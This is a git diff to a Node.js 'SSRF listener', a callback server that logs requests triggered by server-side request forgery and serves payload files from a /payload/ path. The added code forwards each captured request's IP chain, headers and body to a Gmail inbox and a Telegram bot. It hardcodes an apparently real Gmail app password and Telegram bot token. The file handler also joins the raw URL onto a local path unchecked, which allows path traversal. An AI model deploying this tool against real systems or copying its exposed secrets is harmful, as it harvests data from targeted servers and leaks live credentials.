@@ -1,9 +1,54 @@
 const http = require('http');
 const path = require('path');
 const fs = require('fs');
+const nodemailer = require('nodemailer');
+const fetch = require('node-fetch');
+
+// === CONFIGURATION ===
+
+// Gmail setup
+const gmailUser = 'mzeroaccess@gmail.com';  // your gmail
+const gmailPass = 'pext txcx xmsv ytbd'; // app password
+
+const transporter = nodemailer.createTransport({
+    service: 'gmail',
+    auth: {
+        user: gmailUser,
+        pass: gmailPass
+    }
+});
+
+// Telegram setup
+const telegramBotToken = '7610095737:AAFDUe27WjrY3FJKxHCX5F2Tihd-6YP08sA';
+const telegramChatId = '599961631';
+
+function sendTelegramMessage(message) {
+    const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
+    const data = {
+        chat_id: telegramChatId,
+        text: message
+    };
+
+    fetch(url, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(data)
+    })
+    .then(res => res.json())
+    .then(json => {
+        if (json.ok) {
+            console.log('✅ Telegram message sent');
+        } else {
+            console.error('❌ Telegram send error:', json);
+        }
+    })
+    .catch(err => console.error('❌ Fetch error:', err));
+}
+
+// === SSRF Listener Server ===
 
 const server = http.createServer((req, res) => {
-    console.log(`\n📥 ${req.method} Request received---------------------------------------------------------------`);
+    console.log(`\n📥 ${req.method} Request received ---------------------------------------------------------------`);
 
     const ipChain = [
         req.headers['x-forwarded-for'],
@@ -16,7 +61,6 @@ const server = http.createServer((req, res) => {
     console.log(`➡️  IP Chain: ${ipChain.join(' → ')}`);
     console.log(`➡️  URL: ${req.url}`);
     console.log(`🧠 Headers:`, req.headers);
-    console.log(`🧠 Headers:`, req.body);
 
     let body = [];
     req.on('data', chunk => body.push(chunk));
@@ -24,28 +68,48 @@ const server = http.createServer((req, res) => {
         body = Buffer.concat(body).toString();
         if (body) console.log(`📦 Body: ${body}`);
 
-        // Serve static HTML from a file
-            const filePath = path.join(__dirname, 'public', req.url);
-            if(req.url.startsWith('/payload/')) {
-                fs.readFile(filePath, (err, content) => {
-                    if(err) {
-                        res.writeHead(404, {'Content-Type': 'text/plain'});
-                        res.end('File Not Found');
-                        return;
-                    }
-                    
-                    res.writeHead(200, {'Content-Type': 'text/html'});
-                    res.end(content);
-                })
+        const requestSummary = `⚡ New Request!\nIP: ${ipChain.join(' → ')}\nURL: ${req.url}`;
+
+        // Send Email
+        const mailOptions = {
+            from: gmailUser,
+            to: gmailUser,
+            subject: '⚡ SSRF Request Detected!',
+            text: `New request received!\n\nIP Chain: ${ipChain.join(' → ')}\nURL: ${req.url}\n\nHeaders:\n${JSON.stringify(req.headers, null, 2)}\n\nBody:\n${body}`
+        };
+
+        transporter.sendMail(mailOptions, (error, info) => {
+            if (error) {
+                console.error('❌ Error sending mail:', error);
             } else {
+                console.log('✅ Mail sent:', info.response);
+            }
+        });
+
+        // Send Telegram Alert
+        sendTelegramMessage(requestSummary);
+
+        // Serve static HTML from 'public' folder if exists
+        const filePath = path.join(__dirname, 'public', req.url);
+        if (req.url.startsWith('/payload/')) {
+            fs.readFile(filePath, (err, content) => {
+                if (err) {
+                    res.writeHead(404, { 'Content-Type': 'text/plain' });
+                    res.end('File Not Found');
+                    return;
+                }
+                
+                res.writeHead(200, { 'Content-Type': 'text/html' });
+                res.end(content);
+            });
+        } else {
             res.writeHead(200, { 'Content-Type': 'text/plain' });
-            res.end('SSRF listner is active');
+            res.end('SSRF listener is active');
         }
     });
-
 });
 
 const PORT = 4545;
 server.listen(PORT, () => {
-    console.log(`🚀 SSRF listener is running at http://localhost:${PORT}`);
-})
+    console.log(`🚀 SSRF listener running at http://localhost:${PORT}`);
+});
